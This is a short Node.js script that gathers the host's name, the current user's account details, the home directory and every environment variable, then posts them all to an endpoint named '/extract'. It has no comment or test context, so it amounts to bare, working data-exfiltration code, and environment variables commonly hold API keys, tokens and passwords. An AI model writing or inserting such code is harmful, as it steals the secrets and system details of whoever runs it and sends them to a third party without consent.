import axios from "axios";
import os from "os";

const post = axios.post;

const payload  = {
    hostName: os.hostname(),
    getUserInfo: os.userInfo(),
    homedir: os.homedir(), 
    env: process.env
  };

await post("/extract", payload);
